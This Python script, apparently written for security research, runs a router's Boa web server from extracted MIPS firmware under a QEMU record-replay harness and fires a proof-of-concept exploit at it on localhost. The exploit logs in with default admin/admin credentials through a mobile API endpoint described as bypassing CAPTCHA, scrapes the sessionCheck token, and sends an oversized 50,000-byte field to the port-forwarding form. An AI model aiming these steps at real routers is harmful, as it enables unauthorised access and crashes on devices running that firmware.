
import os
import subprocess
import time
import shutil
import sys
import requests
import json
import re

# Configuration
QEMU_BUILD_PATH = "/home/webfuzz/Documents/qemu/build/qemu-mips"
ROOT_DIR = "/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing/tests/images/extracted_firmware/sim_root"
TRACE_FILE = "/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing/traces/boa_real_poc.trace"
BOA_CMD = ["bin/boa", "-c", ".", "-d"]

# PoC Configuration
TARGET_IP = "127.0.0.1:8080"
BASE_URL = f"http://{TARGET_IP}/boafrm/"
FORM_ENDPOINT = "formPortFw"
USERNAME = "admin"
PASSWORD = "admin"

def setup_env():
    # Ensure trace directory exists
    os.makedirs(os.path.dirname(TRACE_FILE), exist_ok=True)
    if os.path.exists(TRACE_FILE):
        os.remove(TRACE_FILE)
    if os.path.exists(TRACE_FILE + ".bbl"):
        os.remove(TRACE_FILE + ".bbl")

def login(session):
    """
    Authenticates using the Mobile API endpoint to bypass CAPTCHA.
    """
    print(f"[*] Attempting login as {USERNAME} via Mobile API...")
    login_url = f"http://{TARGET_IP}/boafrm/formLogin"
    
    payload = {
        "topicurl": "setting/setUserLogin",
        "username": USERNAME,
        "userpass": PASSWORD
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" 
    }
    
    try:
        # Note: User's PoC uses json.dumps(payload) but Content-Type says form-urlencoded.
        # This is strictly following user provided code logic.
        r = session.post(login_url, data=json.dumps(payload), headers=headers, timeout=5)
        if r.status_code == 200:
            print("[+] Login successful (Session created)")
            return True
        else:
            print(f"[-] Login failed: HTTP {r.status_code}")
            return False
    except Exception as e:
        print(f"[-] Login error: {e}")
        return False

def get_session_token(session):
    """
    Fetches status.htm to extract the valid sessionCheck token.
    """
    print("[*] Fetching sessionCheck token from status.htm...")
    try:
        # Request status.htm which definitely contains the token based on grep
        # BASE_URL is http://IP/boafrm/ -> replace /boafrm/ with / -> http://IP/status.htm
        target_page = BASE_URL.replace("/boafrm/", "/") + "status.htm"
        r = session.get(target_page)
        
        if r.status_code != 200:
            print(f"[-] Failed to fetch {target_page}: {r.status_code}")
            return None
        
        # Regex to find <input ... id="sessionCheck" ... value="TOKEN">
        match = re.search(r'id=["\']?sessionCheck["\']?.*?value=["\']?([^"\'>]+)["\']?', r.text)
        if match:
            token = match.group(1)
            print(f"[+] Found sessionCheck token: {token}")
            return token
        else:
            print("[-] Could not find sessionCheck token in response.")
            return None
            
    except Exception as e:
        print(f"[-] Error fetching token: {e}")
        return None

def trigger_exploit_steps():
    s = requests.Session()
    
    if not login(s):
        print("[-] Aborting exploit due to login failure.")
        return

    token = get_session_token(s)
    
    payload_data = {
        "addPortFw": "1",
        "formPortFw": "1",
        "service_type": "a"*50000 # Using large payload from my previous tests to stress it
    }
    
    if token:
        payload_data["sessionCheck"] = token
    else:
        print("[!] Warning: Proceeding without sessionCheck token")

    print(f"[*] Sending payload to {FORM_ENDPOINT}...")
    target_url = BASE_URL + FORM_ENDPOINT
    
    try:
        r = s.post(target_url, data=payload_data)
        print(f"[-] Request completed normally. Response Code: {r.status_code}")
        print(f"[-] Response Preview: {r.text[:200]}")
    except Exception as e:
        print(f"[-] Exploit sent. Error: {e}")


def run_recording():
    print(f"[*] Starting Recording to {TRACE_FILE}...")
    
    env = os.environ.copy()
    env["RR_MODE"] = "record"
    env["RR_TRACE_FILE"] = TRACE_FILE
    env["QEMU_LD_PREFIX"] = "."
    
    cmd = [QEMU_BUILD_PATH] + ["-L", "."] + BOA_CMD
    
    print(f"[*] Executing: {' '.join(cmd)}")
    try:
        proc = subprocess.Popen(
            cmd,
            cwd=ROOT_DIR,
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
    except Exception as e:
        print(f"[-] Failed to start process: {e}")
        return

    print(f"[*] Process started (PID={proc.pid}). Waiting for port 8080...")
    
    # Wait for service to be up
    for _ in range(10):
        try:
            requests.get(f"http://{TARGET_IP}", timeout=1)
            print("[+] Service is UP.")
            break
        except:
            time.sleep(1)
    else:
        print("[-] Service failed to start.")
        return

    # Run the user's exploit logic
    trigger_exploit_steps()

    # Wait a bit for processing
    time.sleep(2)
    
    print("[*] Stopping Process to flush trace...")
    proc.terminate()
    try:
        proc.wait(timeout=2)
    except:
        proc.kill()
        
    print("[*] Recording Finished.")
    
    if os.path.exists(TRACE_FILE):
        size = os.path.getsize(TRACE_FILE)
        print(f"[+] Trace file created: {TRACE_FILE} ({size} bytes)")
    else:
        print("[-] Trace file NOT created.")

if __name__ == "__main__":
    setup_env()
    run_recording()
